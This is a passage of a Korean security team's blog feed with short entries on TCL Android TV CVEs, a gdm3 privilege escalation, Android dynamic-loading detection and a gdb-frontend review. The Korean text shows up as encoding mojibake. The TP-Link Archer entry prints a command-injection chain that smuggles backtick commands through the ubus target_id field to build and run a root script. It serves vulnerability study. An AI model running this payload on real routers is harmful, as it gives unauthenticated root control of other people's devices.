      
      <tag>arbitrary code execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Two CVEs on TCL Android TVs</title>
    <link href="/2020/11/11/fabu1ous/2020-11-11/"/>
    <url>/2020/11/11/fabu1ous/2020-11-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://sick.codes/extraordinary-vulnerabilities-discovered-in-tcl-android-tvs-now-worlds-3rd-largest-tv-manufacturer/">Extraordinary Vulnerabilities Discovered in TCL Android TVs</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>TCL android TV </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>TCL android TVì— ëŒ€í•œ CVEë²ˆí˜¸ê°€ 2ê°œ ë°œê¸‰ëìŠµë‹ˆë‹¤. TCLì€ ì¤‘êµ­ ì „ìì œí’ˆ íšŒì‚¬ë¡œ í˜„ì¬ TV ì‹œì¥ì—ì„œ 3ë²ˆì§¸ë¡œ í° ë¹„ì¤‘ì„ ì°¨ì§€í•˜ê³  ìˆìŠµë‹ˆë‹¤. ì·¨ì•½ì ì„ ì œë³´í•œ Sick Codesì™€ John Jacksonì€ ì œì¡°ì‚¬ì˜ ì˜ë„ê°€ ì˜ì‹¬ìŠ¤ëŸ½ë‹¤ëŠ” ë§ì„ ì¡°ì‹¬ìŠ¤ëŸ½ê²Œ í•˜ê³  ìˆìŠµë‹ˆë‹¤. </p><ul><li>CVE-2020-27403 : TVì˜ 7989ë²ˆ í¬íŠ¸ì— ì›¹ì„œë²„ê°€ ë™ì‘í•˜ê³  ìˆìœ¼ë©°,  ë‹¨ìˆœíˆ ì´ê³³ì— ì ‘ì†í•˜ëŠ” ê²ƒ ë§Œìœ¼ë¡œ ëª¨ë“  file systemì— ì ‘ê·¼ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</li><li>CVE-2020-28055 : ì•…ì„± apk ë“±ì˜ local unprivileged attackerê°€ critical í•œ ì‹œìŠ¤í…œ ë¦¬ì†ŒìŠ¤ì— ì½ê¸° ë° ì“°ê¸°ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</li></ul><p>7989ë²ˆ í¬íŠ¸ëŠ” unassigned portì…ë‹ˆë‹¤. ì¦‰, íŠ¹ì •í•œ ëª©ì ì´ ë¶€ì—¬ëœ ë²ˆí˜¸ê°€ ì•„ë‹ˆê¸° ë•Œë¬¸ì— 7989ë²ˆ í¬íŠ¸ì— httpë¡œ file systemì„ ë‚´ë³´ë‚¼ ì´ìœ ê°€ ì—†ìŠµë‹ˆë‹¤. ë˜í•œ ì œì¡°ì‚¬ê°€ TVì— ëŒ€í•œ ì™„ë²½í•œ ì›ê²© ì œì–´ê°€  ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><blockquote><p>Please make your own conclusions from our research.</p></blockquote><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://sick.codes/sick-2020-009">https://sick.codes/sick-2020-009</a></p><p><a href="https://sick.codes/sick-2020-012">https://sick.codes/sick-2020-012</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>android tv</tag>
      
      <tag>tcl</tag>
      
      <tag>tv</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-16125: Local Privilege Escalation (LPE) in Ubuntu gdm3</title>
    <link href="/2020/11/10/l0ch/2020-11-10/"/>
    <url>/2020/11/10/l0ch/2020-11-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2020-202-gdm3-LPE-unresponsive-accounts-daemon">Local Privilege Escalation (LPE) in Ubuntu gdm3 - CVE-2020-16125</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>gdm version â‰¤ 3.36.3-0ubuntu0.20.04.1</p><p>accountsservice version â‰¤ 0.6.55-0ubuntu12 ~ 20.04.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>gdm3ì—ì„œ ì‹œìŠ¤í…œ ê¶Œí•œì˜ ê³„ì •ì„ ë§Œë“¤ì–´ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>gdm3(gnome display manager)ì€ ê·¸ë˜í”½ ì¸í„°í˜ì´ìŠ¤ë¡œ ë¡œê·¸ì¸ ë° ì‚¬ìš©ì ì¸ì¦ì„ ì²˜ë¦¬í•˜ëŠ”ë°, ìƒˆë¡œ ì„¤ì¹˜ëœ ì‹œìŠ¤í…œ ë“±ì˜ ì´ìœ ë¡œ ì‚¬ìš©ì ê³„ì •ì„ ì°¾ì„ ìˆ˜ ì—†ì„ ë•Œ <code>gnome-initial-setup</code> ì„ í˜¸ì¶œí•˜ê³  sudo ê·¸ë£¹ì˜ ìƒˆë¡œìš´ ê³„ì •ì„ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>gdm3ì—ì„œëŠ” ê¸°ì¡´ ê³„ì •ì„ ì°¾ê¸° ìœ„í•´ D-Bus ë©”ì†Œë“œ í˜¸ì¶œì„ ì‚¬ìš©í•´ <code>accountsservice</code> ë°ëª¬ì˜ <code>look_for_existing_users_sync</code> ì—ì„œ ê¸°ì¡´ ì‚¬ìš©ì ëª©ë¡ì„ ê°€ì ¸ì˜µë‹ˆë‹¤. ì´ë•Œ ì„œë¹„ìŠ¤ ê±°ë¶€ ê³µê²©ìœ¼ë¡œ <code>accountsservice</code> ë°ëª¬ì´ ì‘ë‹µí•˜ì§€ ì•Šë„ë¡ í•˜ë©´ D-Bus ë©”ì†Œë“œ í˜¸ì¶œì´ ì‹œê°„ ì´ˆê³¼ë¡œ ì¸í•´ ì—°ê²°ì´ ì‹¤íŒ¨í•˜ê³  <code>privâ†’have_existing_user_accounts</code> ì˜ ê¸°ë³¸ê°’ì¸ falseê°€ ìœ ì§€ë©ë‹ˆë‹¤.</p><p>ì´í›„<code>wants_initial_setup</code> ì—ì„œ <code>privâ†’have_existing_user_accounts</code>ê°€ falseë©´ gdm3ëŠ” í˜„ì¬ ì‹œìŠ¤í…œì— ê³„ì •ì´ ì—†ëŠ” ê²ƒìœ¼ë¡œ ì¸ì‹í•˜ê³  <code>gnome-initial-setup</code>ì„ í˜¸ì¶œí•´ ì‹œìŠ¤í…œ ê¶Œí•œì˜ ê³„ì •ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì˜ íŒ¨ì¹˜ëŠ” <code>priv-&gt;have_existing_user_accounts</code>ì˜ ê¸°ë³¸ê°’ì„ trueë¡œ ìˆ˜ì •í•˜ëŠ” ê²ƒìœ¼ë¡œ ì ìš©ë˜ì—ˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>ubuntu</tag>
      
      <tag>gdm3</tag>
      
      <tag>accountsservice</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-10882 Bypass</title>
    <link href="/2020/11/09/idioth/2020-11-09/"/>
    <url>/2020/11/09/idioth/2020-11-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2020/minesweeper.md">Pwn2Own Tokyo2020</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>tdpServer daemon(<em>/usr/bin/tdpServer</em>) running on TP-Link Archer A7 and C7(AC1750), hardware version 5, MIPS Arch, firmware ver.200721 and 200628</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>í•´ë‹¹ ì·¨ì•½ì ì€ ë¼ìš°í„°ì˜ LANì— ìˆëŠ” ê³µê²©ìë§Œ ì•…ìš©í•  ìˆ˜ ìˆì§€ë§Œ íŠ¹ë³„í•œ ì¸ì¦ì´ í•„ìš”í•˜ì§€ ì•Šì€ ì·¨ì•½ì ì…ë‹ˆë‹¤.</p><p>CVE-200-10882ì—ì„œ <code>system(systemCmd)</code>ì— ì˜í•´ Command Injection ì·¨ì•½ì ì´ ì¡´ì¬í•˜ì˜€ìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ <code>system()</code> ì‚¬ìš© ëŒ€ì‹  lua ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì´ìš©í•˜ì—¬ <code>lua_onemesh_call(slave_mac)</code>ì„ í†µí•´ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•¨ìœ¼ë¡œì¨ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤. <code>lua_onemesh_call()</code>ì€ <code>luci.controller.admin.onemesh</code> lua ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ë©° ì¸ìˆ˜ë¥¼ ì „ë‹¬í•˜ê³  ìš”ì²­ëœ í•¨ìˆ˜ì˜ í•¸ë“¤ëŸ¬ë¥¼ ì‹¤í–‰í•˜ëŠ”  <code>dispatch</code>ë¼ëŠ” ì´ë¦„ì˜ íŠ¹ë³„í•œ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ë•Œ <code>sync_wifi_specified(slave_mac)</code>ì´ ì‹¤í–‰ë©ë‹ˆë‹¤. <code>sync_wifi_specified()</code>ëŠ” ë§¤ê°œ ë³€ìˆ˜ë¥¼ <code>target_id</code>ë¡œ <code>printf</code>ë¥¼ ì‚¬ìš©í•˜ì—¬ êµ¬ì„±ë˜ë©° json ë‚´ìš©ìœ¼ë¡œ ì‹¤ì œ ëª…ë ¹ì´ ì‹¤í–‰ë©ë‹ˆë‹¤. jsonì„ escape í•˜ë©´ rootë¡œ ì‹¤í–‰ë˜ëŠ” lua script processì—ì„œ ëª…ë ¹ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><pre><code class="hljs json">ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;, &quot;timeout&quot;:5, &quot;target_id&quot;:&quot;&lt;Controlled_Parameter&gt;&quot;&#125;&#x27; &amp;</code></pre><p>slave_macì˜ ê²½ìš° <code>strncpy(slave_mac, *(char **)(iVar6 + 0x10), 0x11)</code>ë¡œ ë³µì‚¬ë˜ë©° <code>memset(slave_mac, 0, 0x424)</code>ë¡œ memset ë©ë‹ˆë‹¤. ë˜í•œ ë°”ì´íŠ¸ ì •ë ¬ë¡œ ì¸í•˜ì—¬ slave_mac ë³€ìˆ˜ëŠ” 0x12ë§Œí¼ í• ë‹¹ë˜ë©° 17ìê¹Œì§€ ë¬¸ìë¥¼ ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs json">ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;;&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;.&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;/&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;q&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`sh b`&#x27;&quot;&#125;&#x27; &amp;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>command injection</tag>
      
      <tag>idioth</tag>
      
      <tag>tp-link</tag>
      
      <tag>lua</tag>
      
      <tag>tdpserver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Detecting Dynamic Loading in Android App</title>
    <link href="/2020/11/08/fabu1ous/2020-11-08/"/>
    <url>/2020/11/08/fabu1ous/2020-11-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://sayfer.io/blog/dynamic-loading-in-android-applications-with-proc-maps/">Detecting Dynamic Loading in Android Applications With /proc/maps</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Android 10 API 29 ì´ìƒ ë²„ì „</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Android applicationì€ dynamic loadingì„ í†µí•´ run-time ë„ì¤‘ ì–´ëŠ ì‹œì ì—ë¼ë„ ì½”ë“œë¥¼ ë©”ëª¨ë¦¬ì— ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. API level 29ë¶€í„´ ì´ dynamic loadingì„ ì•…ìš©í•´ apkì˜ ì •ì  ê²€ì‚¬ë¥¼ í”¼í•´ ê°€ëŠ” ì•…ì„±ì½”ë“œë“¤ì„ ë§‰ê¸° ìœ„í•´ apkì— ì†í•˜ì§€ ì•Šì€ ì½”ë“œì˜ loadë¥¼ ë§‰ê³  ìˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ì—¬ì „íˆ DexClassLoaderì— ì˜í•œ .dex íŒŒì¼ì˜ dynamic loadingì´ ê°€ëŠ¥í•´ ì—¬ì „íˆ ì•…ìš©ì— ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ëª¨ë“  í”„ë¡œì„¸ìŠ¤ëŠ” ê°ê° <code>/proc/[PID]</code>ë¼ëŠ” ë””ë ‰í„°ë¦¬ë¥¼ ê°–ê³ , ê·¸ì¤‘ <code>/proc/[PID]/maps</code>ë¼ëŠ” íŒŒì¼ì€ í”„ë¡œì„¸ìŠ¤ì˜ ë§¤í•‘ëœ ë©”ëª¨ë¦¬ê°€ ê¸°ë¡ë¼ìˆìŠµë‹ˆë‹¤.  ë”°ë¼ì„œ í”„ë¡œì„¸ìŠ¤ê°€ ì–´ë– í•œ íŒŒì¼ì— ì ‘ê·¼í•˜ë©´ <code>/proc/[PID]/maps</code>ì— ê¸°ë¡ì´ ë‚¨ìŠµë‹ˆë‹¤. ì´ ê¸°ë¡ì„ í†µí•´ í”„ë¡œì„¸ìŠ¤ê°€ <code>/data/data</code> ë””ë ‰í„°ë¦¬ ì† .dex ì ‘ê·¼ ì—¬ë¶€ë¥¼ ê²€ì‚¬í•´ dynamic loadingì„ íƒì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.android.com/reference/dalvik/system/DexClassLoader">https://developer.android.com/reference/dalvik/system/DexClassLoader</a></p><p><a href="https://developer.android.com/about/versions/10/behavior-changes-10">https://developer.android.com/about/versions/10/behavior-changes-10</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>dynamic loading</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] gdb-frontend í¬ë„ˆë¸”ì— ì í•©í•œê°€?</title>
    <link href="/2020/11/08/fabu1ous/gdb-frontend-review/"/>
    <url>/2020/11/08/fabu1ous/gdb-frontend-review/</url>
    
    <content type="html"><![CDATA[<h1 id="5ê°œì›”-ë¬µíŒ-ë§í¬"><a href="#5ê°œì›”-ë¬µíŒ-ë§í¬" class="headerlink" title="5ê°œì›” ë¬µíŒ ë§í¬"></a>5ê°œì›” ë¬µíŒ ë§í¬</h1><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/1.png"></p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/2.png"></p><p>ëª‡ ë‹¬ ì „ Fanduí˜•ë‹˜ì´ ì§ì ‘ ì‚¬ìš©í•´ë³´ê³  í›„ê¸°ë¥¼ ì•Œë ¤ë‹¬ë¼ëŠ” ë§ê³¼ í•¨ê»˜ ë§í¬ë¥¼ í•˜ë‚˜ ë˜ì ¸ì£¼ì…¨ìŠµë‹ˆë‹¤. í•  ì¼ë„ ë¬µí˜€ë‘¬ì•¼ ì œë§›! 5ë‹¬ ë™ì•ˆ ê³ ì´ ëª¨ì…”ë†“ì€ GDBFrontend, ë˜¥ì¸ì§€ ëœì¥ì¸ì§€ ì°ì–´ ë¨¹ì–´ ë´…ì‹œë‹¤.</p><h1 id="ì„¤ì¹˜-ë°-ì‹¤í–‰"><a href="#ì„¤ì¹˜-ë°-ì‹¤í–‰" class="headerlink" title="ì„¤ì¹˜ ë° ì‹¤í–‰"></a>ì„¤ì¹˜ ë° ì‹¤í–‰</h1><p><a href="https://github.com/rohanrhu/gdb-frontend">rohanrhu/gdb-frontend</a></p><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> &lt;https://github.com/rohanrhu/gdb-frontend.git&gt; gdb-frontend<span class="hljs-built_in">cd</span> gdb-frontend./gdbfrontend</code></pre><p>ê³µì‹ githubì— ë‚˜ì™€ ìˆëŠ” ì„¤ì¹˜ ë°©ë²•ì…ë‹ˆë‹¤. í„°ë¯¸ë„ í‚¤ì‹œê³  ê·¸ëŒ€ë¡œ ì…ë ¥í•˜ì‹œë©´ ë˜ê² ìŠµë‹ˆë‹¤.</p><ol><li>GDB 8.2 ì´ìƒ</li><li>python3</li><li>tmux</li></ol><p>gdb-frontendë¥¼ ì‚¬ìš©í•˜ê¸° ìœ„í•œ ìš”êµ¬ì‚¬í•­ì€ 3ê°€ì§€ê°€ ìˆëŠ”ë°, ì§€ê¸ˆ ì €ì˜ í™˜ê²½ì€ Ubuntu 20.04ì´ë¯€ë¡œ tmuxë§Œ ì¶”ê°€ë¡œ ì„¤ì¹˜í•´ì£¼ë©´ í™˜ê²½ ì„¸íŒ…ì€ ëì…ë‹ˆë‹¤.</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/3.png"></p><p>gdb-frontendë¥¼ ì‹¤í–‰ì‹œí‚¨ í›„ ë¸Œë¼ìš°ì €ë¡œ <a href="http://127.0.0.1:5551/terminal/"><code>http://127.0.0.1:5551/terminal/</code></a>ì—  ì ‘ì†í•´ì£¼ì‹œë©´ ë©ë‹ˆë‹¤. <code>-w</code> ì˜µì…˜ìœ¼ë¡œ working directoryë„ ì„¤ì •í•´ ì¤„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h1 id="íŒŒì´ì–´-í­ìŠ¤ëŠ”-ë‚˜ê°€ìˆì–´"><a href="#íŒŒì´ì–´-í­ìŠ¤ëŠ”-ë‚˜ê°€ìˆì–´" class="headerlink" title="íŒŒì´ì–´ í­ìŠ¤ëŠ” ë‚˜ê°€ìˆì–´"></a>íŒŒì´ì–´ í­ìŠ¤ëŠ” ë‚˜ê°€ìˆì–´</h1><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/4.png"></p><p>ë§Œì•½ íŒŒì´ì–´í­ìŠ¤ë¥¼ ì“°ê³  ê³„ì‹ ë‹¤ë©´ ë‹¤ë¥¸ ë¸Œë¼ìš°ì €ë¥¼ ì‚¬ìš©í•˜ì…”ì•¼ í•©ë‹ˆë‹¤. gdb-frontend serverì™€ì˜ ì—°ê²°ì´ ê³„ì† ëŠê¸°ê¸¸ë˜ ì›ì¸ì„ ì°¾ëŠë¼ ì‹œê°„ ë‚­ë¹„ë¥¼ ì¢€ ë§ì´ í–ˆìŠµë‹ˆë‹¤. ìì£¼ ì• ìš©í•˜ëŠ” gdb í”ŒëŸ¬ê·¸ì¸ pwndbgì™€ì˜ ì¶©ëŒì´ ë¬¸ì œë¼ ìƒê°í•´ pwndbgë„ ì§€ì›Œë³´ê³ , ì•„ì˜ˆ VMì„ ìƒˆë¡œ ìƒì„±í•´ ì²˜ìŒë¶€í„° ë‹¤ì‹œ í™˜ê²½ êµ¬ì¶•í•´ë´¤ì§€ë§Œ ê²°êµ­ íŒŒí­ê³¼ì˜ í˜¸í™˜ ë¬¸ì œì˜€ë„¤ìš”â€¦</p><p><a href="https://github.com/rohanrhu/gdb-frontend/issues/5">tmux.conf invalid settings problem Â· Issue #5 Â· rohanrhu/gdb-frontend</a></p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/5.png"></p><h1 id="gui-í›‘ì–´ë³´ê¸°"><a href="#gui-í›‘ì–´ë³´ê¸°" class="headerlink" title="gui í›‘ì–´ë³´ê¸°"></a>gui í›‘ì–´ë³´ê¸°</h1><pre><code class="hljs bash">$ ./gdbfrontend -w /home/fabu1ous/Desktop/GDBFrontend v0.3.0-gitListening on 127.0.0.1: &lt;http://127.0.0.1:5551/&gt;Open this address <span class="hljs-keyword">in</span> web browser: &lt;http://127.0.0.1:5551/terminal/&gt;</code></pre><p>ë¸Œë¼ìš°ì €ë¡œ ì ‘ì†í•œ <a href="http://127.0.0.1:5551/terminal/"><code>http://127.0.0.1:5551/terminal/</code></a>ì˜ í™”ë©´ì€ gdb shellì´ ë„ì›Œì§„ terminalê³¼ gui ë¶€ë¶„ìœ¼ë¡œ ë‚˜ë‰©ë‹ˆë‹¤. terminal ë¶€ë¶„ì€ gdbì™€ ë‹¤ë¥¼ ê²Œ ì—†ìœ¼ë‹ˆ ë„˜ì–´ê°€ê³ , guiì˜ ê¸°ë³¸ì ì¸ êµ¬ì„±ê³¼ ê¸°ëŠ¥ ì¤‘ ì œê°€ ì¨ë³´ë©´ì„œ ì¢‹ë‹¤ê³  ëŠë‚€ ì ë“¤ì„ ì¨ë³´ê² ìŠµë‹ˆë‹¤.</p><p>[ ! ] ê°œë°œìì˜ ê´€ì ì—ì„œ ë””ë²„ê±°ë¥¼ ì¨ë³¸ ì ì´ ë‹¨ í•œ ë²ˆë„ ì—†ìœ¼ë‹ˆ ìœ ì˜í•˜ì„¸ìš”.</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/6.png"></p><p>í•¨ìˆ˜ ë³„ë¡œ assembly ì½”ë“œë¡œ ì¶œë ¥í•´ì£¼ë©° ë‹¤ìŒì— ì‹¤í–‰ë  ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ì—°í•œ ìƒ‰ìœ¼ë¡œ í•˜ì´ë¼ì´íŠ¸ ë©ë‹ˆë‹¤. ê·¸ì¤‘ì—ì„œë„ Call Stack 0ë²ˆì— ë‚˜íƒ€ë‚˜ëŠ” í•¨ìˆ˜ì˜ í•˜ì´ë¼ì´íŠ¸ ëœ ë¶€ë¶„ì€ eip (í˜¹ì€ rip)ì…ë‹ˆë‹¤. í˜„ì¬ í”„ë¡œê·¸ë¨ íë¦„ì˜ ìœ„ì¹˜ë¥¼ ëŒ€ë‹¨íˆ ì§ê´€ì ìœ¼ë¡œ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê¸€ì¬ì£¼ê°€ ì—†ì–´ì„œ ì´ë ‡ê²Œë°–ì— ì„¤ëª…ì„ ëª» í•˜ê² ë„¤ìš”. ã…ã…</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/7.png"></p><p>break pointëŠ” instructionì˜ ì£¼ì†Œë¥¼ í´ë¦­í•´ì„œ ìƒì„± í˜¹ì€ ì‚­ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¢Œì¸¡ì— break pointë“¤ì˜ ëª©ë¡ì„ ë³´ì—¬ì£¼ë©° ì²´í¬ë°•ìŠ¤ë¡œ í™œì„±í™” ì—¬ë¶€ë¥¼ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê¸°ì¡´ì— ì‚¬ìš©í•˜ë˜ pwndbgì—ì„œ ê°€ì¥ ì•„ì‰¬ì› ë˜ ì ì´ ë°”ë¡œ break point ê´€ë¦¬ê°€ ë²ˆê±°ë¡­ë‹¤ëŠ” ê²ƒì¸ë°, gdb-frontendëŠ” GUIë¡œ ì´ ê¸°ëŠ¥ì„ ì œê³µí•˜ë‹ˆ ìƒëŒ€ì ìœ¼ë¡œ ì¢€ ë” í¸ë¦¬í•©ë‹ˆë‹¤.</p><h1 id="ì“¸-ê°€ì¹˜ê°€-ìˆëŠ”ê°€"><a href="#ì“¸-ê°€ì¹˜ê°€-ìˆëŠ”ê°€" class="headerlink" title="ì“¸ ê°€ì¹˜ê°€ ìˆëŠ”ê°€?"></a>ì“¸ ê°€ì¹˜ê°€ ìˆëŠ”ê°€?</h1><p>í™•ì¥ì„±ì´ ì¢‹ë‹¤ëŠ” ì ì„ ë‚´ì„¸ìš°ê³  ìˆëŠ” ë§Œí¼ ì„¤ëª…í• ê²Œ ë§ì§„ ì•Šë„¤ìš”.</p><p>ìœ„ì—ì„œ ì„¤ëª…í•œ ê²ƒë“¤ì„ ì œì™¸í•˜ë©´ ëŒ€ë¶€ë¶„ì˜ ê¸°ëŠ¥ì„ gdbì— ì˜ì¡´í•˜ê³  ìˆê³ , ê·¸ëƒ¥ gdbë§Œ ì‚¬ìš©í•˜ëŠ” ê²ƒê³¼ í¬ê²Œ ë‹¤ë¥´ë‹¤ëŠ” ëŠë‚Œì€ ë°›ì§€ ëª»í–ˆìŠµë‹ˆë‹¤. gdbë¥¼ ì¨ë³´ì‹  ë¶„ë“¤ì€ ì•„ì‹œê² ì§€ë§Œ gdbë§Œì„ ì‚¬ìš©í•´ì„œ ë””ë²„ê¹…í•˜ëŠ” ë³€íƒœëŠ” ì—†ìŠµë‹ˆë‹¤. ì ì–´ë„ í•´í‚¹ ì”¬ì—ëŠ” ì—†ì„ ê±°ì•¼. ë©”ëª¨ë¦¬ë‚˜ registerê°’ì˜ ë³€í™”ì— ì§‘ì¤‘í•˜ë©° ë””ë²„ê¹…í•˜ëŠ” ì €ì—ê²Œ instruction í•˜ë‚˜ ì‹¤í–‰í•  ë•Œë§ˆë‹¤ <code>info reg</code> ê°™ì€ ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•˜ë¼ê³  í•œë‹¤ë©´â€¦ ì–´í›„â€¦</p><p>ê·¸ëŸ° ì ì„ gdb-frontendê°€ ê°œì„ í•´ì£¼ì§„ ì•ŠìŠµë‹ˆë‹¤. UIê°€ ì´ì˜ê¸´ í•˜ì§€ë§Œ ì €ì—ê²Œ í•„ìš”í•œ ë¶€ë¶„ì€ êµ¬í˜„ì´ ì•ˆë¼ ìˆìœ¼ë‹ˆ â€˜ì´ìœ ì“°ë ˆê¸°â€™ë¼ëŠ” ë‹¨ì–´ëŠ” ì´ëŸ´ ë•Œ ì“°ëŠ” ë§ ì´ê² ì£ . ì •ì‘ DisassemblyëŠ” í™”ë©´ì— ë‘ ë²ˆì´ë‚˜ ì¶œë ¥í•´ì¤ë‹ˆë‹¤. ã…ã…</p><blockquote><p>L0ch æ›° : ì´ìœ ì“°ë ˆê¸°ë„¤ ì´ìœ ì“°ë ˆê¸°</p></blockquote><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/8.png"></p><p>gdb-frontendë¡œ CTFë¬¸ì œ í•˜ë‚˜ í’€ê³ , ì—°êµ¬ ê¸€ì„ ê°€ì¥í•œ write-upì„ ì‘ì„±í•˜ë ¤ í–ˆì§€ë§Œ ë„ì €íˆ gdb-frontendë§Œìœ¼ë¡œ ë¬¸ì œë¥¼ í’€ ìˆœ ì—†ì„ ê±° ê°™ë„¤ìš”. ê·¸ë˜ì„œ ì¼ë§ì˜ í¬ë§ì„ ê°–ê³  pwndbgì™€ ì—°ë™í•´ë´¤ìŠµë‹ˆë‹¤ë§Œ, gdb-frontendëŠ” ì£¼ê°ì „ë„ë¥¼ í—ˆìš©í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. gdb-frontendì˜ uiê°€ ì—†ì–´ì§ˆ ì •ë„ë¡œ terminalì˜ í¬ê¸°ë¥¼ í‚¤ì›Œì•¼ í•˜ê³ ,</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/9.png"></p><p>ë¬´ì—‡ë³´ë‹¤ gdb-frontendê°€ ë»—ì–´ë²„ë¦½ë‹ˆë‹¤. ì¼ë‹¨ ì œê°€ ì‚¬ìš©í•˜ë©´ì„œ crash ë‚˜ëŠ” ìƒí™©ì€ 2ê°€ì§€ ìˆì—ˆìŠµë‹ˆë‹¤.</p><ol><li>ë¶„ì„í•˜ê³  ìˆëŠ” 